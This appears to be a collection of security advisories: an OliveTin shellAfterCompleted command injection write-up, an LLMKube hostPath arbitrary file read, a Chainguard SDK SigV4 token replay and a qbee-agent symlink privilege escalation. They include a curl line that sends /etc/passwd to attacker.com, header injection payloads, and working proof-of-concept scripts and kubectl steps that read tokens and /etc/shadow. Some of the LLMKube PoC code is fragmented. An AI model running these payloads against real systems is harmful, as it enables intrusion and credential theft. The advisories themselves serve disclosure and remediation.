The main action's shell commands go through checkShellArgumentSafety (called from handleShellBranch at line 693 of executor.go), which blocks dangerous argument types like password, url, email, raw_string_multiline, and very_dangerous_raw_string from shell mode.

stepExecAfter calls none of these checks. The output variable is:

  • Not a declared argument with a type — it's internally created
  • Not validated against any regex or type system
  • Not passed through checkShellArgumentSafety
  • Directly interpolated into a shell command template

A grep for checkShellArgumentSafety in the codebase confirms it is only invoked at one location:

executor.go:693: if err := checkShellArgumentSafety(req); err != nil {

This is inside handleShellBranch (the primary action execution), not in stepExecAfter.

Injection Vectors

Vector 1: Output Reflection

If a primary action echoes user-controlled input:

actions:
  - title: Lookup User
    shell: "echo 'User: {{ .Arguments.username }}'"
    shellAfterCompleted: "audit-log '{{ .Arguments.output }}'"
    arguments:
      - name: username
        type: ascii_identifier

While ascii_identifier constrains the direct argument, the command output itself is the injection vector. If the action processes external data (files, APIs, databases) and that data contains shell metacharacters, the output flows unsanitized into shellAfterCompleted.

Vector 2: Exec Mode Output Injection

Actions using exec mode (array form) safely handle arguments in the primary command but the output still flows to shellAfterCompleted through a shell:

actions:
  - title: Read External Data
    exec:
      - cat
      - /shared/data/{{ .Arguments.filename }}
    shellAfterCompleted: "process-result '{{ .Arguments.output }}'"
    arguments:
      - name: filename
        type: ascii_identifier

If /shared/data/report contains text like:

'; curl http://attacker.com/exfil?data=$(cat /etc/passwd) #

The shellAfterCompleted becomes:

process-result ''; curl http://attacker.com/exfil?data=$(cat /etc/passwd) #'

This executes arbitrary commands as the OliveTin process user.

Vector 3: Username Injection via Trusted Headers

When trusted header authentication is used (see Finding 04), the ot_username variable comes directly from an HTTP header with no sanitization:

actions:
  - title: Any Action
    shell: "echo ok"
    shellAfterCompleted: "logger 'Action completed by {{ .Arguments.ot_username }}'"

An attacker sets:

X-Remote-User: '; id > /tmp/pwned #

The shellAfterCompleted becomes:

logger 'Action completed by '; id > /tmp/pwned #'

This chains Findings 04 and 05: trusted header spoofing enables username-based injection into post-execution commands.

PoC

Prerequisites

  • OliveTin instance with an action configured with shellAfterCompleted
  • The shellAfterCompleted template references {{ .Arguments.output }} or {{ .Arguments.ot_username }}

Config

listenAddressSingleHTTPFrontend: 0.0.0.0:1337
logLevel: "DEBUG"
checkForUpdates: false

actions:
  - title: Process File
    id: process-file
    exec:
      - cat
      - "/tmp/olivetin-data/{{ .Arguments.filename }}"
    shellAfterCompleted: "echo '{{ .Arguments.output }}' >> /tmp/olivetin-audit.log"
    arguments:
      - name: filename
        type: ascii_identifier

Step 1: Create a malicious data file

# On the server, create a file with shell injection payload
mkdir -p /tmp/olivetin-data
echo "normal_data'; touch /tmp/PWNED; echo '" > /tmp/olivetin-data/report

Step 2: Execute the action normally

curl -s -X POST http://127.0.0.1:1337/api/StartActionAndWait \
  -H 'Content-Type: application/json' \
  -d '{"bindingId":"process-file","arguments":[{"name":"filename","value":"report"}]}'

Step 3: Verify injection

ls -la /tmp/PWNED
# If the file exists, the injection was successful

Explanation: The cat command (exec mode) safely reads the file. The output normal_data'; touch /tmp/PWNED; echo ' is captured. Then shellAfterCompleted renders:

echo 'normal_data'; touch /tmp/PWNED; echo '' >> /tmp/olivetin-audit.log

This executes touch /tmp/PWNED as a second command.

Step 4: Username injection (with trusted headers)

# Add to config
authHttpHeaderUsername: "X-Remote-User"

curl -s -X POST http://127.0.0.1:1337/api/StartActionAndWait \
  -H 'Content-Type: application/json' \
  -H "X-Remote-User: test'; touch /tmp/PWNED2; echo '" \
  -d '{"bindingId":"some-action","arguments":[]}'

If shellAfterCompleted uses {{ .Arguments.ot_username }}, the injection executes.

Python PoC

#!/usr/bin/env python3
"""PoC: Second-Order Command Injection via shellAfterCompleted output variable.

Distinct from CVE-2026-27626 (password type injection in primary execution).
This exploits the post-execution step which has zero argument safety checks.
"""

import requests
import time
import os

TARGET = "http://127.0.0.1:1337"
BINDING_ID = "process-file"

def setup_payload():
    """Create a data file containing shell injection payload."""
    os.makedirs("/tmp/olivetin-data", exist_ok=True)
    with open("/tmp/olivetin-data/exploit", "w") as f:
        f.write("data'; id > /tmp/rce-proof; echo '")
    print("[+] Created malicious data file")

def trigger_action():
    """Execute the action that reads the malicious file."""
    resp = requests.post(
        f"{TARGET}/api/StartActionAndWait",
        json={
            "bindingId": BINDING_ID,
            "arguments": [{"name": "filename", "value": "exploit"}]
        },
        headers={"Content-Type": "application/json"}
    )
    print(f"[+] Action response: {resp.status_code}")
    return resp.json()

def verify_rce():
    """Check if the injected command executed."""
    time.sleep(2)
    if os.path.exists("/tmp/rce-proof"):
        with open("/tmp/rce-proof") as f:
            print(f"[!] RCE CONFIRMED: {f.read().strip()}")
        return True
    else:
        print("[-] /tmp/rce-proof not found")
        return False

if __name__ == "__main__":
    setup_payload()
    result = trigger_action()
    print(f"[*] Action output: {result}")
    verify_rce()

Impact

  • Remote Code Execution: Arbitrary commands execute as the OliveTin process user
  • Chained with Finding 04: Trusted header spoofing enables injection via ot_username
  • Bypass of CVE-2026-27626 fix: The fix for that CVE only addressed checkShellArgumentSafety in the primary execution step; the post-execution step was not hardened
  • Exec mode bypass: Actions using the safe exec mode (array form) for the primary command can still be exploited through their output flowing to the shell-based shellAfterCompleted

Remediation

  1. Apply checkShellArgumentSafety (or equivalent) to stepExecAfter variables
  2. Shell-escape the output, ot_username, and exitCode values before template substitution (e.g., using shellescape.Quote())
  3. Consider adding an exec-mode variant for shellAfterCompleted to avoid shell interpretation entirely
  4. Sanitize ot_username to reject shell metacharacters regardless of the auth provider

entry.title: [github.com/defilantech/llmkube] LLMKube: Arbitrary Host File Read via Model.spec.source hostPath Injection
entry.content:
Summary

LLMKube's ModelReconciler accepts arbitrary absolute paths and file:// URIs in the Model.spec.source field and propagates them to two distinct sinks without path allowlisting: (1) os.Open() inside the controller pod itself (copyLocalModel), and (2) a Kubernetes HostPathVolumeSource that mounts the attacker-supplied path into the inference pod's init container. Any namespace user with permission to create or update Model and InferenceService custom resources can read arbitrary files accessible to the controller pod (e.g., the controller's own Kubernetes service-account token) or arbitrary files on the node where the inference pod is scheduled (e.g., /etc/kubernetes/kubelet.conf). Model caching, the feature that activates the hostPath sink, is enabled by default in both the CLI and the official Helm chart. CVSS v3.1 Base Score: 7.7 (High).

Details

Entry point — Model.spec.source field

The Source field in api/v1alpha1/model_types.go:47-48 carries a kubebuilder validation pattern that explicitly permits absolute paths:

// +kubebuilder:validation:Pattern=`^(https?|file|pvc|hf)://.*|^/[^\s]+$|^[a-zA-Z0-9][\w\-\.\/]+$`
Source string `json:"source"`

The branch ^/[^\s]+$ matches any non-whitespace absolute path on the host.

Sink 1 — Controller-pod arbitrary file read (copyLocalModel)

internal/controller/source.go:93-103 classifies a source as local and extracts the path with no sanitization:

// isLocalSource: returns true for any "/" prefix or "file://" prefix
func isLocalSource(source string) bool {
    return strings.HasPrefix(source, "/") || strings.HasPrefix(source, "file://")
}

// getLocalPath: strips "file://" prefix only; no canonicalization, no allowlist
func getLocalPath(source string) string {
    return strings.TrimPrefix(source, "file://")
}

internal/controller/model_controller.go:241 passes the attacker-controlled source into fetchModel, which reaches copyLocalModel at line 664-667:

f, err := os.Open(localPath)   // localPath = getLocalPath(model.Spec.Source)

An attacker sets model.spec.source: /var/run/secrets/kubernetes.io/serviceaccount/token; the controller opens its own SA token and writes it to the model-cache PVC, which the attacker can subsequently read.

Sink 2 — Node arbitrary file read via HostPathVolumeSource

internal/controller/model_storage.go:560-568 converts the same path into a Kubernetes host volume with no canonical-root check:

if isLocalModelSource(model.Spec.Source) {
    localPath := getLocalPath(model.Spec.Source)
    volumes = append(volumes, corev1.Volume{
        Name: "host-model",
        VolumeSource: corev1.VolumeSource{
            HostPath: &corev1.HostPathVolumeSource{
                Path: localPath,
                Type: func() *corev1.HostPathType { t := corev1.HostPathFile; return &t }(),
            },
        },
    })
    initVolumeMounts = append(initVolumeMounts, corev1.VolumeMount{
        Name:      "host-model",
        MountPath: "/host-model/model.gguf",
        ReadOnly:  true,
    })
}

internal/controller/deployment_builder.go:248-250 calls buildModelStorageConfig, and lines 329-333 embed storageConfig.volumes directly into the generated Deployment's PodSpec. When the inference pod starts, the init container copies the node file to the model-cache PVC.

The only filename-level sanitization is in internal/controller/filename.go:44-75, which constrains the destination basename only and has no effect on HostPath.Path.

Model caching is enabled by default: cmd/main.go:120 and charts/llmkube/values.yaml:274 (modelCache.enabled: true).

PoC

Prerequisites

  • LLMKube 0.8.27 or 0.8.28 installed with default Helm values (modelCache.enabled=true).
  • Attacker possesses create/update permissions for Model and InferenceService CRDs in a target namespace, plus get on Pod logs.

Path A — Live Kubernetes cluster (hostPath sink)

NS=llmkube-poc
kubectl create ns "$NS"

# Step 1: Create a Model whose source points to a sensitive node file
cat <<'YAML' | kubectl apply -n "$NS" -f -
apiVersion: inference.llmkube.dev/v1alpha1
kind: Model
metadata:
  name: hostread
spec:
  source: /etc/passwd
YAML

kubectl wait -n "$NS" --for=jsonpath='{.status.phase}'=Ready \
    model/hostread --timeout=180s

CACHEKEY="$(kubectl get model hostread -n "$NS" \
    -o jsonpath='{.status.cacheKey}')"
BASENAME="$(basename \
    "$(kubectl get model hostread -n "$NS" -o jsonpath='{.status.path}')")"

# Step 2: Create an InferenceService that prints the copied file
cat <<YAML | kubectl apply -n "$NS" -f -
apiVersion: inference.llmkube.dev/v1alpha1
kind: InferenceService
metadata:
  name: hostread
spec:
  modelRef: hostread
  runtime: llamacpp
  image: busybox:1.36
  command: ["sh","-c","cat /models/${CACHEKEY}/${BASENAME}; sleep 3600"]
YAML

# Step 3: Retrieve the exfiltrated file
kubectl logs -n "$NS" deploy/hostread -c llama-server

Expected output — contents of /etc/passwd from the node:

root:x:0:0:root:/root:/bin/bash
...

Variant — controller SA token (copyLocalModel sink)

cat <<'YAML' | kubectl apply -n "$NS" -f -
apiVersion: inference.llmkube.dev/v1alpha1
kind: Model
metadata:
  name: satoken
spec:
  source: /var/run/secrets/kubernetes.io/serviceaccount/token
YAML
# After the model becomes Ready, its cache entry contains the raw JWT.

Path B — Docker-only reproduction (no live cluster)

This path exercises the copyLocalModel / os.Open sink using verbatim copies of isLocalSource() and getLocalPath() from internal/controller/source.go:93-103.

# Build from the parent directory of vuln-001/
docker build --no-cache -f vuln-001/Dockerfile -t llmkube-vuln001-poc .

# Read /etc/shadow from inside the container (simulates controller pod filesystem)
docker run --rm -e VULN001_TARGET=/etc/shadow llmkube-vuln001-poc

# Or use the Python driver
python3 vuln-001/poc.py --target /etc/shadow

Expected output:

os.Open SUCCESS — 104 bytes read from /etc/shadow
root:*:19800:0:99999:7:::
daemon:*:19800:0:99999:7:::
llmkube-sa:$6$salt$examplehash:19800:0:99999:7:::
VULN-001 PASS: arbitrary file read confirmed

Phase 2 dynamic verification result

Both /etc/shadow (104 bytes) and /var/run/secrets/kubernetes.io/serviceaccount/token (430 bytes, raw JWT) were successfully read inside the container, and the HostPathVolumeSource JSON was confirmed to be generated with the attacker-supplied path.

Impact

This is a Path Traversal / Arbitrary File Read vulnerability (CWE-22). It affects any Kubernetes cluster running LLMKube with default settings.

Who is impacted:

  • Cluster operators and tenants — A low-privileged namespace user who can write Model and InferenceService CRDs (the default RBAC posture for LLMKube users) can escalate to reading the controller's Kubernetes SA token and using it to list/get Secrets cluster-wide, pivot to other namespaces, or impersonate service accounts.
  • Node security boundary — Via the hostPath sink, an attacker can read any file present on the Kubernetes node at pod-scheduling time, including kubeadm certificates (/etc/kubernetes/pki/), kubelet credentials (/etc/kubernetes/kubelet.conf), and container runtime sockets.
  • Confidentiality — High (arbitrary read of host and controller secrets). Integrity and Availability are not directly affected.

The vulnerability is network-reachable (attacker talks to the Kubernetes API server), requires low privilege (namespaced CRD write only), needs no user interaction, and impacts resources beyond the attacker's own namespace (changed scope).

Reproduction artifacts

Dockerfile

# VULN-001 PoC — Arbitrary File Read via Model.spec.source (LLMKube CWE-22)
#
# Strategy: compile a standalone Go harness that contains verbatim copies of
# the three vulnerable functions from the LLMKube repository and proves that
# supplying an absolute path as Model.spec.source causes os.Open() to read
# arbitrary files — identical to what copyLocalModel() does at runtime.
#

    result = subprocess.run(
        cmd,
        capture_output=capture,
        text=True,
        **kwargs,

        "docker", "build",

        "-f", DOCKERFILE,
        "-t", IMAGE_NAME,

    result = run(

            "-e", f"VULN001_TARGET={target}",
            IMAGE_NAME,

        capture=True,
        check=False,
    )
    combined = result.stdout + result.stderr

def parse_evidence(output: str, target: str) -> dict:
    """Extract key evidence markers from PoC output."""
    lines = output.splitlines()
    exfil_lines = []

    bytes_read = None
    step3_ok = False

        if "os.Open SUCCESS" in line and "bytes" in line:

    )

entry.title: [chainguard.dev/sdk] Chainguard SDK: AWS SigV4 token replay in auth/aws.VerifyToken — Chainguard-Audience/Chainguard-Identity binding headers not required in SignedHeaders
entry.content:
Summary

The auth/aws package of the chainguard.dev/sdk Go library provides Chainguard's AWS-backed identity federation (an AWS workload proves its identity to Chainguard by signing an AWS STS GetCallerIdentity request). Its verifier, VerifyToken, reads the Chainguard-Audience and Chainguard-Identity binding headers from a presented token but does not require them to be covered by the SigV4 signature. AWS STS validates only the headers listed in SignedHeaders and ignores all others, so an attacker can take a GetCallerIdentity request that a victim signed for a different relying party, inject or rewrite those two headers after signing (without invalidating the signature), and replay it to any service that authenticates callers with VerifyToken. The binding those headers were meant to provide is therefore forgeable — a verifier-side (relying-party) authentication bypass / cross-service token replay.

Background

The package uses the standard "signed GetCallerIdentity" pattern — the same approach HashiCorp Vault's AWS auth method and Kubernetes aws-iam-authenticator use: the caller signs an AWS STS GetCallerIdentity request with its AWS credentials to prove who it is, and presents that signed request as a bearer token. It has two halves:

  • GenerateToken (client): builds the GetCallerIdentity request, adds the Chainguard-Audience and Chainguard-Identity headers that bind the proof to a specific Chainguard audience (issuer) and assumable identity, SigV4-signs it, and serializes it into a token.
  • VerifyToken (relying party): decodes the token, checks those two binding headers, forwards the request to AWS STS to confirm the caller's real AWS identity (ARN), and returns it so a Chainguard token can be issued for that identity.

The binding headers exist so a proof minted for one audience/identity cannot be reused for another — a defense against cross-service replay — and their security depends entirely on being covered by the SigV4 signature.

Impact

A relying party calling auth/aws.VerifyToken can be induced to accept a GetCallerIdentity proof that a victim produced for an unrelated purpose — for example a request minted for HashiCorp Vault's AWS auth method, Kubernetes aws-iam-authenticator, a different audience, or one captured from logs or a proxy — and to treat it as proof of the victim's AWS identity for an attacker-chosen audience and identity. The signed request is valid within its ~15-minute window. No access to the victim's AWS credentials is required; the attacker only needs a fresh signed GetCallerIdentity request from the victim principal.

Code that uses only auth/aws.GenerateToken (token generation) is not affected — the generator correctly includes the binding headers in the signature. Only verifiers using auth/aws.VerifyToken are affected.

Affected versions

All released versions of chainguard.dev/sdk that include auth/aws.VerifyToken, up to and including v0.1.106.

Patches

Fixed in chainguard.dev/sdk v0.1.107. The fix requires both the Chainguard-Audience and Chainguard-Identity headers to be present in the request's SigV4 SignedHeaders before their values are trusted (mirroring the mitigation HashiCorp Vault applies by requiring X-Vault-AWS-IAM-Server-ID to be signed). It additionally adds defense-in-depth checks on the request method, the STS host, and the request timestamp. Upgrade to v0.1.107 or later.

Workarounds

There is no client-side workaround; the fix is in the verifier. Operators of services that verify AWS-backed identities with VerifyToken should upgrade as soon as the patched release is available.

References

  • AWS Signature Version 4 — signed headers: https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_sigv.html
  • Comparable mitigation: HashiCorp Vault requires the X-Vault-AWS-IAM-Server-ID header to appear in SignedHeaders before trusting it.

Credits

Reported by Kris Kennaway (Datadog).

  • https://github.com/chainguard-dev/sdk/security/advisories/GHSA-wq26-3j2m-4hvv
  • https://nvd.nist.gov/vuln/detail/CVE-2026-71861
  • https://github.com/chainguard-dev/sdk/commit/d27997d62aaffe85f905cce4cbe8cdebbd5e24eb
  • https://github.com/chainguard-dev/sdk/releases/tag/v0.1.107

entry.title: [go.qbee.io/agent] qbee-agent: Local Privilege Escalation and Arbitrary File Tampering via Symlink Following in createFile helper
entry.content:
This is a Local Privilege Escalation (LPE) vulnerability stemming from improper symlink handling (CWE-59: Link Following) and improper ownership management (CWE-282) inside the qbee-agent file manager logic.

Impact

Any managed device running qbee-agent up to the affected versions. The impact manifests in three distinct vectors:

  1. Primary Vector (Full Privilege Escalation to Root - Default Configuration): If an unprivileged user's account is managed by the SSH Keys bundle, they can replace or remove their own ~/.ssh directory and create a symlink pointing to /root/.ssh. On the next configuration apply, qbee-agent follows the symlink and writes the user's server-provisioned public key directly into /root/.ssh/authorized_keys. Since the symlink resides inside the user's own home directory, kernel protections like fs.protected_symlinks do not block this execution. The attacker can then instantly log in as root via SSH.

  2. Secondary Vector (Arbitrary File Overwrite / DoS via RAUC Staging): On devices utilizing RAUC download mode, the agent uses a predictable, world-writable staging path (/tmp/.bundle.raucb.part). If fs.protected_symlinks is disabled (0), an unprivileged user can symlink this path to a vital system file (e.g., /etc/shadow or /etc/pam.d/*), causing the agent to truncate or overwrite it with server-supplied update data during a RAUC update deployment.

  3. Tertiary Vector (Arbitrary File Re-ownership via File Distribution): If an operator configures a file-distribution/template destination under a directory owned by an unprivileged user, the attacker can create a symlink at the partial download path targeting a sensitive system file. The agent will then inadvertently execute file.Chown() on the targeted file, handing ownership over to the unprivileged attacker.

Patches

The vulnerability has been addressed by hardening file creation and directory traversal inside app/configuration/file_manager.go. Specifically, the agent now enforces syscall.O_NOFOLLOW and proper existence validation flags during privileged operations to prevent link resolution outside intended directories.

Users should upgrade to version 2026.27 (or newer) to fully mitigate these vectors.

Workarounds

If upgrading immediately is not feasible, administrators can apply the following mitigations:

  1. Disable the SSH Keys Bundle: Temporarily turn off SSH key management within the Qbee platform for non-trusted local accounts to eliminate the primary privilege escalation vector.

  2. Restrict Local Home Directory Alterations: Enforce strict file permissions or monitoring on managed user home directories to block unprivileged users from deleting or replacing ~/.ssh with a symbolic link.

  3. Enable Kernel Symlink Protection: Ensure that system-level symlink protections are active to mitigate the secondary /tmp vector by verifying that the following sysctl parameter is set to 1 (though note this does not fix the primary home directory vector):

sysctl -w fs.protected_symlinks=1
